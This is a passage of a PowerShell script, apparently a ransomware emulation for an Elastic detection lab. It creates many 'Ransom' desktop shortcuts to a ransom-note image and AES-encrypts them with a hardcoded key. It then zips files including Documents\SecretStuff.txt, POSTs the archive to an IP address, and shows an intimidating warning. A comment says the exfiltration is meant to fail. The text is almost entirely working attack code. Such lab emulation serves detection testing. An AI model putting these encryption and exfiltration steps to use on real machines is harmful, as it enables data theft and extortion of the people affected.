$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom53.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom54.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom55.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom56.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom57.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom58.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom59.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom60.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom61.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom62.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom63.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom64.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom65.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom66.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom67.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom68.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom69.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

Start-Sleep -S 5

# Encrypt files
Write-Host "[+] Encrypting Files" -ForegroundColor Green
Install-Module -Name DRTools -Force
$key = "SWxvdmVyYW5zb213YXJlPDM="
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom1.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom2.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom3.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom4.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom5.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom6.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom7.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom8.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom9.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom10.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom11.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom12.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom13.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom14.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom15.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom16.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom17.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom18.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom19.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom20.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom21.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom22.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom23.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom24.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom25.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom26.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom27.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom28.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom29.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom30.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom31.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom32.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom33.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom34.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom35.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom36.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom37.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom38.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom39.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom40.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom41.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom42.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom43.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom44.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom45.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom46.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom47.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom48.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom49.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom50.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom51.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom52.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom53.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom54.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom55.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom56.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom57.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom58.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom59.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom60.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom61.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom62.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom63.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom64.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom65.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom66.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom67.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom68.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom69.lnk

Start-Sleep -S 15

Write-Host "[+] Preparing Files" -ForegroundColor Green
$files = "C:\Users\$env:USERNAME\Desktop\Ransom.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom1.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom2.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom3.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom4.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom6.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom7.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom8.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom9.lnk", "C:\Users\$env:USERNAME\Documents\SecretStuff.txt"
Compress-Archive -LiteralPath $files -DestinationPath $outfile\Ransom_Data.zip

Write-Host "[+] Exfiltrating Data" -ForegroundColor Green
# Exfil will fail due to IP address
$content1 = Get-Content $outfile\Ransom_Data.zip
Invoke-WebRequest -Uri 172.31.33.33 -Method POST -Body $content1

Start-Sleep -S 5

Add-Type -AssemblyName System.Windows.Forms
$global:balmsg = New-Object System.Windows.Forms.NotifyIcon
$path = (Get-Process -id $pid).Path
$balmsg.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$balmsg.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Warning
$balmsg.BalloonTipText = "CONTROL CAN SOMTIMES BE AN ILLUSION. BUT SOMETIMES YOU NEED ILLUSION TO GAIN CONTROL.";
$balmsg.BalloonTipTitle = "Attention $Env:USERNAME"
$balmsg.Visible = $true
$balmsg.ShowBalloonTip(20000)
